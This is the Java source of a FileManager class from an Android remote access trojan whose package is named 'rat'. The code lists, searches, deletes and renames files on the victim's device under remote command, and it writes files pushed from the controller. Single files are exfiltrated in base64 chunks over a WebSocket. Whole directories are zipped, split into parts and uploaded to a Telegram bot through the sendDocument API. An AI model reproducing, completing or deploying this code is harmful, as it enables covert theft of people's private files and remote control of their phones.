package com.wexow.rat.managers;

import android.content.Context;
import android.content.SharedPreferences;
import android.util.Base64;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import com.wexow.rat.core.ConnectionManager;

public class FileManager {
    private static final String TAG = "FileManager";
    private static final int CHUNK_SIZE = 512 * 1024; // 512 KB
    private static final int MAX = 500;
    private static final Object DOWNLOAD_LOCK = new Object();
    private static boolean IS_DOWNLOADING = false;
    private static int RESUME_FROM = 0;
    public static String lastDownloadPath = null;
    private static Context currentContext = null;
    private static List<File> CACHED_ZIP_PARTS = null;

    // ⭐ Upload
    private static File currentUploadFile = null;
    private static FileOutputStream currentUploadStream = null;
    private static int currentUploadChunks = 0;
    private static int currentUploadReceived = 0;
    private static String currentUploadPath = null;

    // ⭐ Setup Telegram
    private static final String BOT_TOKEN = "YOUR_BOT_TOKEN";
    private static final String CHAT_ID = "YOUR_CHAT_ID";

    public static void onResumeCommand(int fromChunk) {
        Log.e(TAG, "📥 Resume requested from chunk " + fromChunk);
        synchronized (DOWNLOAD_LOCK) {
            IS_DOWNLOADING = false;
        }
        RESUME_FROM = fromChunk;
        if (lastDownloadPath != null && currentContext != null) {
            download(lastDownloadPath, currentContext);
        }
    }

    public static void walk(String path) {
        new Thread(() -> {
            try {
                File dir = new File(path);
                if (!dir.exists())
                    return;
                File[] files = dir.listFiles();
                JSONArray list = new JSONArray();
                if (files != null) {
                    for (File file : files) {
                        JSONObject jo = new JSONObject();
                        jo.put("name", file.getName());
                        jo.put("isDir", file.isDirectory());
                        jo.put("path", file.getAbsolutePath());
                        jo.put("size", file.length());
                        list.put(jo);
                    }
                }
                JSONObject res = new JSONObject();
                res.put("type", "file_manager");
                res.put("data", list);
                res.put("path", path);
                ConnectionManager.send(res.toString());
            } catch (Exception e) {
                Log.e(TAG, "Walk error: " + e.getMessage());
            }
        }).start();
    }

    public static void download(String path, Context context) {
        currentContext = context;
        lastDownloadPath = path;

        new Thread(() -> {
            try {
                File file = new File(path);
                if (!file.exists()) {
                    sendError("file_download", path, "File does not exist");
                    return;
                }

                // ⭐If it is a single file → WebSocket
                if (file.isFile()) {
                    Log.e(TAG, "📄 Single file → WebSocket");
                    synchronized (DOWNLOAD_LOCK) {
                        if (IS_DOWNLOADING) {
                            Log.e(TAG, "⚠ Already downloading, skipping");
                            return;
                        }
                        IS_DOWNLOADING = true;
                    }
                    try {
                        downloadFileViaWebSocket(file);
                    } finally {
                        synchronized (DOWNLOAD_LOCK) {
                            IS_DOWNLOADING = false;
                        }
                    }
                    return;
                }

                // ⭐ If it is a Directory → Telegram
                if (file.isDirectory()) {
                    Log.e(TAG, "📁 Directory → Telegram");
                    synchronized (DOWNLOAD_LOCK) {
                        if (IS_DOWNLOADING) {
                            Log.e(TAG, "⚠ Already downloading, skipping");
                            return;
                        }
                        IS_DOWNLOADING = true;
                    }
                    try {
                        sendDirectoryToTelegram(file, context);
                    } finally {
                        synchronized (DOWNLOAD_LOCK) {
                            IS_DOWNLOADING = false;
                        }
                    }
                    return;
                }

            } catch (Exception e) {
                Log.e(TAG, "Error: " + e.getMessage());
                e.printStackTrace();
            }
        }).start();
    }

    // ⭐A function to upload a single file via WebSocket
    private static void downloadFileViaWebSocket(File file) {
        try {
            FileInputStream fis = new FileInputStream(file);
            long totalSize = file.length();
            int totalChunks = (int) Math.ceil((double) totalSize / CHUNK_SIZE);

            String transferId = file.getName();
            Log.e(TAG, "=== WebSocket: " + file.getName() + " (chunks=" + totalChunks + ") ===");

            JSONObject start = new JSONObject();
            start.put("type", "file_download_start");
            start.put("transferId", transferId);
            start.put("name", file.getName());
            start.put("totalSize", totalSize);
            start.put("totalChunks", totalChunks);
            ConnectionManager.sendSync(start.toString());

            byte[] buffer = new byte[CHUNK_SIZE];
            int bytesRead;
            int chunkIndex = 0;

            while ((bytesRead = fis.read(buffer)) != -1) {
                byte[] chunk = new byte[bytesRead];
                System.arraycopy(buffer, 0, chunk, 0, bytesRead);

                String encoded = Base64.encodeToString(chunk, Base64.NO_WRAP);
                JSONObject msg = new JSONObject();
                msg.put("type", "file_download_chunk");
                msg.put("transferId", transferId);
                msg.put("chunkIndex", chunkIndex);
                msg.put("data", encoded);

                boolean sent = false;
                for (int attempt = 0; attempt < 5; attempt++) {
                    sent = ConnectionManager.sendSync(msg.toString());
                    if (sent)
                        break;
                    Thread.sleep(2000);
                }

                if (!sent) {
                    Log.e(TAG, "❌ Failed chunk " + chunkIndex);
                    break;
                }

                chunkIndex++;
                if (chunkIndex % 20 == 0) {
                    Log.e(TAG, "Sent " + chunkIndex + "/" + totalChunks);
                }
                Thread.sleep(20);
            }
            fis.close();

            JSONObject end = new JSONObject();
            end.put("type", "file_download_end");
            end.put("transferId", transferId);
            ConnectionManager.sendSync(end.toString());

            Log.e(TAG, "=== WebSocket done: " + file.getName() + " ===");
        } catch (Exception e) {
            Log.e(TAG, "WebSocket error: " + e.getMessage());
        }
    }

    // ⭐ Folder loading function via Telegram
    private static void sendDirectoryToTelegram(File directory, Context context) {
        try {
            Log.e(TAG, "📁 Preparing directory for Telegram: " + directory.getName());

            List<File> zipParts = CACHED_ZIP_PARTS;
            if (zipParts == null || zipParts.isEmpty() || !zipParts.get(0).exists()) {
                Log.e(TAG, "Creating ZIP parts...");
                zipParts = zipDirectorySplitSmart(directory, context, 30 * 1024 * 1024);
                if (zipParts == null || zipParts.isEmpty()) {
                    sendError("file_download", directory.getPath(), "Failed to compress");
                    return;
                }
                CACHED_ZIP_PARTS = zipParts;
                Log.e(TAG, "Cached " + zipParts.size() + " ZIP parts");
            } else {
                Log.e(TAG, "Using cached " + zipParts.size() + " ZIP parts");
            }

            int sentParts = getSentParts(context);
            if (sentParts >= zipParts.size()) {
                Log.e(TAG, "✅ All " + zipParts.size() + " parts sent!");
                resetSentParts(context);
                CACHED_ZIP_PARTS = null;
                return;
            }

            for (int i = sentParts; i < zipParts.size(); i++) {
                File part = zipParts.get(i);

                long sizeMB = part.length() / 1024 / 1024;
                if (part.length() > 50 * 1024 * 1024) {
                    Log.e(TAG, "⚠ Part " + (i + 1) + " too large (" + sizeMB + " MB), skipping");
                    incrementSentParts(context);
                    continue;
                }

                String caption = directory.getName() + "_part" + (i + 1) + "_of_" + zipParts.size();

                Log.e(TAG, "📤 Sending part " + (i + 1) + "/" + zipParts.size() + " (" + sizeMB + " MB)");
                boolean sent = sendFileToTelegram(part, caption);

                if (sent) {
                    incrementSentParts(context);
                    Log.e(TAG, "✅ Part " + (i + 1) + " sent");
                } else {
                    Log.e(TAG, "❌ Part " + (i + 1) + " failed");
                    break;
                }

                Thread.sleep(3000);
            }

            Log.e(TAG, "✅ Directory done: " + directory.getName());

        } catch (Exception e) {
            Log.e(TAG, "Telegram directory error: " + e.getMessage());
            e.printStackTrace();
        }
    }

    // ⭐ Function to send file to Telegram
    private static boolean sendFileToTelegram(File file, String caption) {
        String boundary = "*****" + System.currentTimeMillis() + "*****";
        String lineEnd = "\r\n";
        String twoHyphens = "--";

        HttpURLConnection conn = null;
        DataOutputStream dos = null;
        FileInputStream fis = null;

        try {
            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument");
            conn = (HttpURLConnection) url.openConnection();
            conn.setDoOutput(true);
            conn.setDoInput(true);
            conn.setUseCaches(false);
            conn.setRequestMethod("POST");
            conn.setConnectTimeout(30000);
            conn.setReadTimeout(120000);
            conn.setRequestProperty("Connection", "Keep-Alive");
            conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

            dos = new DataOutputStream(conn.getOutputStream());

            // chat_id
            dos.writeBytes(twoHyphens + boundary + lineEnd);
            dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd + lineEnd);
            dos.writeBytes(CHAT_ID + lineEnd);

            // caption
            dos.writeBytes(twoHyphens + boundary + lineEnd);
            dos.writeBytes("Content-Disposition: form-data; name=\"caption\"" + lineEnd + lineEnd);
            dos.writeBytes(caption + lineEnd);

            // file
            dos.writeBytes(twoHyphens + boundary + lineEnd);
            dos.writeBytes(
                    "Content-Disposition: form-data; name=\"document\"; filename=\"" + file.getName() + "\"" + lineEnd);
            dos.writeBytes("Content-Type: application/octet-stream" + lineEnd + lineEnd);

            fis = new FileInputStream(file);
            byte[] buffer = new byte[8192];
            int bytesRead;
            while ((bytesRead = fis.read(buffer)) != -1) {
                dos.write(buffer, 0, bytesRead);
            }
            fis.close();
            fis = null;

            dos.writeBytes(lineEnd);
            dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
            dos.flush();
            dos.close();
            dos = null;

            int responseCode = conn.getResponseCode();
            Log.e(TAG, "📤 Telegram response: " + responseCode);

            if (responseCode == 200) {
                return true;
            } else {
                InputStream errorStream = conn.getErrorStream();
                if (errorStream != null) {
                    BufferedReader reader = new BufferedReader(new InputStreamReader(errorStream));
                    String line;
                    while ((line = reader.readLine()) != null) {
                        Log.e(TAG, "Telegram: " + line);
                    }
                    reader.close();
                }
                return false;
            }

        } catch (Exception e) {
            Log.e(TAG, "❌ Telegram error: " + e.getMessage());
            return false;
        } finally {
            if (fis != null)
                try {
                    fis.close();
                } catch (Exception ignored) {
                }
            if (dos != null)
                try {
                    dos.close();
                } catch (Exception ignored) {
                }
            if (conn != null)
                conn.disconnect();
        }
    }

    // ⭐ SharedPreferences
    private static int getSentParts(Context context) {
        SharedPreferences prefs = context.getSharedPreferences("wexow", Context.MODE_PRIVATE);
        return prefs.getInt("sent_parts", 0);
    }

    private static void incrementSentParts(Context context) {
        SharedPreferences prefs = context.getSharedPreferences("wexow", Context.MODE_PRIVATE);
        int current = prefs.getInt("sent_parts", 0);
        prefs.edit().putInt("sent_parts", current + 1).apply();
    }

    private static void resetSentParts(Context context) {
        SharedPreferences prefs = context.getSharedPreferences("wexow", Context.MODE_PRIVATE);
        prefs.edit().putInt("sent_parts", 0).apply();
    }

    // ⭐ Folder Splitting function
    private static List<File> zipDirectorySplit(File directory, Context context, long maxSizePerZip) {
        List<File> zipFiles = new ArrayList<>();
        try {
            File cacheDir = context.getCacheDir();
            if (!cacheDir.exists())
                cacheDir.mkdirs();

            List<File> allFiles = new ArrayList<>();
            collectFiles(directory, allFiles);
            Log.e(TAG, "Total files: " + allFiles.size());

            List<List<File>> groups = new ArrayList<>();
            List<File> currentGroup = new ArrayList<>();
            long currentSize = 0;

            for (File f : allFiles) {
                if (currentSize + f.length() > maxSizePerZip && !currentGroup.isEmpty()) {
                    groups.add(currentGroup);
                    currentGroup = new ArrayList<>();
                    currentSize = 0;
                }
                currentGroup.add(f);
                currentSize += f.length();
            }
            if (!currentGroup.isEmpty())
                groups.add(currentGroup);

            Log.e(TAG, "Split into " + groups.size() + " groups");

            for (int i = 0; i < groups.size(); i++) {
                String zipName = directory.getName().replaceAll("[^a-zA-Z0-9._-]", "_") + "_part" + (i + 1) + "_of_"
                        + groups.size() + ".zip";
                File zipFile = new File(cacheDir, zipName);

                FileOutputStream fos = new FileOutputStream(zipFile);
                ZipOutputStream zos = new ZipOutputStream(fos);

                for (File f : groups.get(i)) {
                    String relativePath = f.getAbsolutePath().substring(directory.getAbsolutePath().length() + 1);
                    addToZip(f, relativePath, zos);
                }

                zos.close();
                fos.close();
                zipFiles.add(zipFile);

                Log.e(TAG, "Part " + (i + 1) + ": " + zipName + " (" + zipFile.length() / 1024 / 1024 + " MB)");
            }

            return zipFiles;
        } catch (Exception e) {
            Log.e(TAG, "zipDirectorySplit error: " + e.getMessage());
            return null;
        }
    }

    // ⭐ Smart Splitting: verifies the size after compression
    private static List<File> zipDirectorySplitSmart(File directory, Context context, long maxSizePerZip) {
        List<File> zipFiles = new ArrayList<>();
        try {
            File cacheDir = context.getCacheDir();
            if (!cacheDir.exists())
                cacheDir.mkdirs();

            List<File> allFiles = new ArrayList<>();
            collectFiles(directory, allFiles);
            Log.e(TAG, "Total files: " + allFiles.size());

            List<List<File>> groups = new ArrayList<>();
            List<File> currentGroup = new ArrayList<>();
            long currentSize = 0;

            for (File f : allFiles) {
                if (f.length() > maxSizePerZip) {
                    if (!currentGroup.isEmpty()) {
                        groups.add(currentGroup);
                        currentGroup = new ArrayList<>();
                        currentSize = 0;
                    }
                    List<File> bigGroup = new ArrayList<>();
                    bigGroup.add(f);
                    groups.add(bigGroup);
                    continue;
                }

                if (currentSize + f.length() > maxSizePerZip && !currentGroup.isEmpty()) {
                    groups.add(currentGroup);
                    currentGroup = new ArrayList<>();
                    currentSize = 0;
                }
                currentGroup.add(f);
                currentSize += f.length();
            }
            if (!currentGroup.isEmpty())
                groups.add(currentGroup);

            Log.e(TAG, "Split into " + groups.size() + " groups");

            for (int i = 0; i < groups.size(); i++) {
                String zipName = directory.getName().replaceAll("[^a-zA-Z0-9._-]", "_")
                        + "_part" + (i + 1) + "_of_" + groups.size() + ".zip";
                File zipFile = new File(cacheDir, zipName);

                FileOutputStream fos = new FileOutputStream(zipFile);
                ZipOutputStream zos = new ZipOutputStream(fos);

                for (File f : groups.get(i)) {
                    String relativePath = f.getAbsolutePath().substring(directory.getAbsolutePath().length() + 1);
                    addToZip(f, relativePath, zos);
                }

                zos.close();
                fos.close();

                long sizeMB = zipFile.length() / 1024 / 1024;

                if (zipFile.length() > 50 * 1024 * 1024) {
                    Log.e(TAG, "⚠ Part " + (i + 1) + " is " + sizeMB + " MB, splitting...");
                    List<File> subParts = splitLargeZip(zipFile, cacheDir, directory.getName(), i + 1, groups.size());
                    if (subParts != null && !subParts.isEmpty()) {
                        zipFiles.addAll(subParts);
                        zipFile.delete();
                    } else {
                        zipFiles.add(zipFile);
                    }
                } else {
                    zipFiles.add(zipFile);
                    Log.e(TAG, "Part " + (i + 1) + ": " + sizeMB + " MB");
                }
            }

            return zipFiles;
        } catch (Exception e) {
            Log.e(TAG, "zipDirectorySplitSmart error: " + e.getMessage());
            e.printStackTrace();
            return null;
        }
    }

    // ⭐ Splitting a large ZIP file into parts (without loading the file into
    // memory)
    private static List<File> splitLargeZip(File zipFile, File cacheDir, String baseName, int partNum, int totalParts) {
        List<File> subParts = new ArrayList<>();
        FileInputStream fis = null;
        try {
            long fileSize = zipFile.length();
            int SUB_CHUNK_SIZE = 40 * 1024 * 1024; // 40 MB
            int totalChunks = (int) Math.ceil((double) fileSize / SUB_CHUNK_SIZE);

            Log.e(TAG, "Splitting " + zipFile.getName() + " (" + (fileSize / 1024 / 1024) + " MB) into " + totalChunks
                    + " sub-parts");

            fis = new FileInputStream(zipFile);
            byte[] buffer = new byte[8192]; // 8 KB buffer
            int chunkIndex = 0;
            long bytesWritten = 0;
            FileOutputStream fos = null;

            String subName = baseName.replaceAll("[^a-zA-Z0-9._-]", "_")
                    + "_part" + partNum + "_chunk" + (chunkIndex + 1) + "_of_" + totalChunks + ".bin";
            File subFile = new File(cacheDir, subName);
            fos = new FileOutputStream(subFile);

            int bytesRead;
            while ((bytesRead = fis.read(buffer)) != -1) {
                if (bytesWritten + bytesRead > SUB_CHUNK_SIZE) {
                    fos.flush();
                    fos.close();
                    subParts.add(subFile);
                    Log.e(TAG, "Sub-part " + (chunkIndex + 1) + ": " + (subFile.length() / 1024 / 1024) + " MB");

                    chunkIndex++;
                    bytesWritten = 0;

                    subName = baseName.replaceAll("[^a-zA-Z0-9._-]", "_")
                            + "_part" + partNum + "_chunk" + (chunkIndex + 1) + "_of_" + totalChunks + ".bin";
                    subFile = new File(cacheDir, subName);
                    fos = new FileOutputStream(subFile);
                }

                fos.write(buffer, 0, bytesRead);
                bytesWritten += bytesRead;
            }

            fos.flush();
            fos.close();
            subParts.add(subFile);
            Log.e(TAG, "Sub-part " + (chunkIndex + 1) + ": " + (subFile.length() / 1024 / 1024) + " MB");

            return subParts;

        } catch (Exception e) {
            Log.e(TAG, "splitLargeZip error: " + e.getMessage());
            e.printStackTrace();
            return null;
        } finally {
            if (fis != null)
                try {
                    fis.close();
                } catch (Exception ignored) {
                }
        }
    }

    private static void collectFiles(File dir, List<File> out) {
        File[] files = dir.listFiles();
        if (files != null) {
            for (File f : files) {
                if (f.isFile())
                    out.add(f);
                else if (f.isDirectory())
                    collectFiles(f, out);
            }
        }
    }

    private static void addToZip(File file, String baseName, ZipOutputStream zos) throws Exception {
        FileInputStream fis = new FileInputStream(file);
        ZipEntry entry = new ZipEntry(baseName);
        zos.putNextEntry(entry);
        byte[] buffer = new byte[8192];
        int bytesRead;
        while ((bytesRead = fis.read(buffer)) != -1) {
            zos.write(buffer, 0, bytesRead);
        }
        zos.closeEntry();
        fis.close();
    }

    // ⭐ Function for receiving a file from the server (Upload)
    public static void upload(String path, String base64Data) {
        new Thread(() -> {
            try {
                Log.e(TAG, "===== upload() called =====");
                Log.e(TAG, "Path: " + path);
                Log.e(TAG, "Data size: " + base64Data.length() + " chars");

                byte[] fileData = Base64.decode(base64Data, Base64.NO_WRAP);
                Log.e(TAG, "Decoded: " + fileData.length + " bytes");

                File file = new File(path);
                File parent = file.getParentFile();
                if (parent != null && !parent.exists()) {
                    parent.mkdirs();
                }

                FileOutputStream fos = new FileOutputStream(file);
                fos.write(fileData);
                fos.flush();
                fos.close();

                Log.e(TAG, "✅ File saved: " + path);

                JSONObject res = new JSONObject();
                res.put("type", "file_upload_result");
                res.put("path", path);
                res.put("success", true);
                res.put("size", fileData.length);
                ConnectionManager.send(res.toString());

            } catch (Exception e) {
                Log.e(TAG, "❌ Upload error: " + e.getMessage());
                e.printStackTrace();
                sendError("file_upload", path, e.getMessage());
            }
        }).start();
    }

    public static void uploadStart(String path, int totalChunks, long totalSize) {
        try {
            Log.e(TAG, "===== uploadStart =====");
            Log.e(TAG, "Path: " + path);
            Log.e(TAG, "Total chunks: " + totalChunks);
            Log.e(TAG, "Total size: " + totalSize);

            closeUpload();

            File file = new File(path);
            File parent = file.getParentFile();
            if (parent != null && !parent.exists()) {
                parent.mkdirs();
            }

            currentUploadFile = file;
            currentUploadStream = new FileOutputStream(file);
            currentUploadChunks = totalChunks;
            currentUploadReceived = 0;
            currentUploadPath = path;

            Log.e(TAG, "✅ Upload started: " + path);

            JSONObject res = new JSONObject();
            res.put("type", "file_upload_start");
            res.put("path", path);
            res.put("totalChunks", totalChunks);
            ConnectionManager.send(res.toString());

        } catch (Exception e) {
            Log.e(TAG, "❌ uploadStart error: " + e.getMessage());
            sendError("file_upload", path, e.getMessage());
        }
    }

    // ⭐ Upload
    public static void uploadChunk(int chunkIndex, String base64Data) {
        try {
            if (currentUploadStream == null) {
                Log.e(TAG, "❌ No active upload");
                return;
            }

            byte[] chunkData = Base64.decode(base64Data, Base64.NO_WRAP);
            currentUploadStream.write(chunkData);
            currentUploadReceived++;

            Log.e(TAG, "📥 Chunk " + chunkIndex + " (" + chunkData.length + " bytes) — "
                    + currentUploadReceived + "/" + currentUploadChunks);

            if (currentUploadReceived % 10 == 0) {
                JSONObject res = new JSONObject();
                res.put("type", "file_upload_progress");
                res.put("path", currentUploadPath);
                res.put("received", currentUploadReceived);
                res.put("total", currentUploadChunks);
                res.put("progress", (currentUploadReceived * 100 / currentUploadChunks));
                ConnectionManager.send(res.toString());
            }

        } catch (Exception e) {
            Log.e(TAG, "❌ uploadChunk error: " + e.getMessage());
        }
    }

    // ⭐ Upload
    public static void uploadEnd() {
        try {
            Log.e(TAG, "===== uploadEnd =====");

            if (currentUploadStream != null) {
                currentUploadStream.flush();
                currentUploadStream.close();
                currentUploadStream = null;
            }

            if (currentUploadFile != null) {
                Log.e(TAG, "✅ File saved: " + currentUploadFile.getAbsolutePath()
                        + " (" + currentUploadFile.length() + " bytes)");

                JSONObject res = new JSONObject();
                res.put("type", "file_upload_result");
                res.put("path", currentUploadPath);
                res.put("success", true);
                res.put("size", currentUploadFile.length());
                ConnectionManager.send(res.toString());
            }

            closeUpload();

        } catch (Exception e) {
            Log.e(TAG, "❌ uploadEnd error: " + e.getMessage());
        }
    }

    private static void closeUpload() {
        try {
            if (currentUploadStream != null) {
                currentUploadStream.close();
                currentUploadStream = null;
            }
        } catch (Exception e) {
        }
        currentUploadFile = null;
        currentUploadChunks = 0;
        currentUploadReceived = 0;
        currentUploadPath = null;
    }

    // ⭐ Extract ZIP file after upload
    public static void unzipFile(String zipPath, String destDir) {
        new Thread(() -> {
            try {
                Log.e(TAG, "===== unzipFile =====");
                Log.e(TAG, "ZIP: " + zipPath);
                Log.e(TAG, "Dest: " + destDir);

                File zipFile = new File(zipPath);
                if (!zipFile.exists()) {
                    Log.e(TAG, "❌ ZIP not found");
                    sendError("file_upload", zipPath, "ZIP not found");
                    return;
                }

                File destFolder = new File(destDir);
                if (!destFolder.exists()) {
                    destFolder.mkdirs();
                }

                java.util.zip.ZipInputStream zis = new java.util.zip.ZipInputStream(
                        new java.io.FileInputStream(zipFile));

                java.util.zip.ZipEntry entry;
                byte[] buffer = new byte[8192];
                int totalFiles = 0;

                while ((entry = zis.getNextEntry()) != null) {
                    String fileName = entry.getName();
                    File outputFile = new File(destFolder, fileName);

                    if (!outputFile.getCanonicalPath().startsWith(destFolder.getCanonicalPath())) {
                        Log.e(TAG, "⚠ Skipping unsafe path: " + fileName);
                        continue;
                    }

                    if (entry.isDirectory()) {
                        outputFile.mkdirs();
                    } else {
                        File parent = outputFile.getParentFile();
                        if (parent != null && !parent.exists()) {
                            parent.mkdirs();
                        }

                        FileOutputStream fos = new FileOutputStream(outputFile);
                        int bytesRead;
                        while ((bytesRead = zis.read(buffer)) != -1) {
                            fos.write(buffer, 0, bytesRead);
                        }
                        fos.close();
                        totalFiles++;
                    }
                    zis.closeEntry();
                }
                zis.close();

                Log.e(TAG, "✅ Extracted " + totalFiles + " files to " + destDir);

                zipFile.delete();
                Log.e(TAG, "🗑️ ZIP deleted");

                JSONObject res = new JSONObject();
                res.put("type", "file_unzip_result");
                res.put("success", true);
                res.put("files", totalFiles);
                res.put("dest", destDir);
                ConnectionManager.send(res.toString());

            } catch (Exception e) {
                Log.e(TAG, "❌ unzipFile error: " + e.getMessage());
                e.printStackTrace();
                sendError("file_upload", zipPath, e.getMessage());
            }
        }).start();
    }

    public static void delete(String path) {
        new Thread(() -> {
            try {
                File file = new File(path);
                boolean ok = deleteRecursive(file);
                JSONObject res = new JSONObject();
                res.put("type", "file_delete");
                res.put("path", path);
                res.put("success", ok);
                ConnectionManager.send(res.toString());
            } catch (Exception e) {
            }
        }).start();
    }

    private static boolean deleteRecursive(File file) {
        if (file.isDirectory()) {
            File[] children = file.listFiles();
            if (children != null) {
                for (File c : children)
                    deleteRecursive(c);
            }
        }
        return file.delete();
    }

    public static void rename(String oldPath, String newName) {
        new Thread(() -> {
            try {
                File oldFile = new File(oldPath);
                File newFile = new File(oldFile.getParent(), newName);
                boolean ok = oldFile.renameTo(newFile);
                JSONObject res = new JSONObject();
                res.put("type", "file_rename");
                res.put("path", oldPath);
                res.put("success", ok);
                ConnectionManager.send(res.toString());
            } catch (Exception e) {
            }
        }).start();
    }

    public static void createDirectory(String path) {
        new Thread(() -> {
            try {
                File dir = new File(path);
                boolean ok = dir.mkdirs();
                JSONObject res = new JSONObject();
                res.put("type", "file_mkdir");
                res.put("path", path);
                res.put("success", ok);
                ConnectionManager.send(res.toString());
            } catch (Exception e) {
            }
        }).start();
    }

    public static void search(String rootPath, String query, int max) {
        new Thread(() -> {
            try {
                List<File> results = new ArrayList<>();
                searchRecursive(new File(rootPath), query.toLowerCase(), results, max);
                JSONArray arr = new JSONArray();
                for (File f : results) {
                    JSONObject jo = new JSONObject();
                    jo.put("name", f.getName());
                    jo.put("path", f.getAbsolutePath());
                    jo.put("isDir", f.isDirectory());
                    jo.put("size", f.length());
                    arr.put(jo);
                }
                JSONObject res = new JSONObject();
                res.put("type", "file_search");
                res.put("query", query);
                res.put("data", arr);
                res.put("count", results.size());
                ConnectionManager.send(res.toString());
            } catch (Exception e) {
            }
        }).start();
    }

    private static void searchRecursive(File dir, String query, List<File> results, int max) {
        if (results.size() >= max)
            return;
        File[] files = dir.listFiles();
        if (files == null)
            return;
        for (File f : files) {
            if (results.size() >= max)
                return;
            if (f.getName().toLowerCase().contains(query))
                results.add(f);
            if (f.isDirectory() && !f.getName().startsWith(".")) {
                searchRecursive(f, query, results, max);
            }
        }
    }

    private static void sendError(String type, String path, String error) {
        try {
            JSONObject res = new JSONObject();
            res.put("type", type);
            res.put("path", path);
            res.put("success", false);
            res.put("error", error);
            ConnectionManager.send(res.toString());
        } catch (Exception e) {
        }
    }
}
